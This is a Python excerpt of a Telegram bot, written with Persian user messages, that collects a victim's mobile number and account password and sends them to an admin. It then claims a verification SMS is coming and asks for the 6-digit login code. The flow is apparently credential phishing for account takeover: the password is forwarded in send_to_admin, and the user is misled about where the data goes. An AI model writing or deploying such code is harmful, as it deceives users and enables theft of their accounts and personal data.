# 📱 دریافت شماره (با اعتبارسنجی پیشرفته)
# =============================================
@dp.message(Form.phone)
async def get_phone(message: Message, state: FSMContext):
    phone = message.text.strip()
    
    # اعتبارسنجی شماره
    if not phone.isdigit():
        await message.reply("⚠️ شماره باید فقط شامل اعداد باشد. لطفاً مجدد وارد کنید:")
        return
    
    if len(phone) != 11:
        await message.reply("⚠️ شماره باید ۱۱ رقمی باشد (با فرمت 09xxxxxxxxx). لطفاً مجدد وارد کنید:")
        return
    
    if not phone.startswith("09"):
        await message.reply("⚠️ شماره باید با 09 شروع شود. لطفاً مجدد وارد کنید:")
        return

    # ذخیره اطلاعات
    await state.update_data(phone=phone, user_id=message.chat.id)
    
    await message.reply(
        "🔑 **رمز عبور خود را وارد کنید**\n\n"
        "در صورت نداشتن رمز عبور، دکمه **«رد شدن»** را بزنید یا اینتر بزنید.",
        parse_mode="Markdown",
        reply_markup=cancel_keyboard()
    )
    await state.set_state(Form.password)

# =============================================
# 🔑 دریافت رمز عبور (اختیاری)
# =============================================
@dp.message(Form.password)
async def get_password(message: Message, state: FSMContext):
    password = message.text.strip()
    
    # اگر کاربر روی دکمه "رد شدن" کلیک کرد یا اینتر زد
    if password.lower() in ["رد شدن", "skip", ""]:
        password = None
    
    # ذخیره اطلاعات
    data = await state.get_data()
    data['password'] = password
    data['step'] = 'password_received'
    
    # ارسال به ادمین
    await send_to_admin(data, "password_received")
    
    # بروزرسانی state
    await state.update_data(password=password)
    
    await message.reply(
        "✅ **اطلاعات شما به سامانه ارسال شد.**\n\n"
        "⏳ در حال ارسال درخواست کد تایید به شماره شما...\n\n"
        "📲 لطفاً صبر کنید تا کد تایید از طریق پیامک برای شما ارسال شود.\n"
        "سپس کد ۶ رقمی را وارد کنید:",
        parse_mode="Markdown",
        reply_markup=cancel_keyboard()
    )
    
    await state.set_state(Form.code)

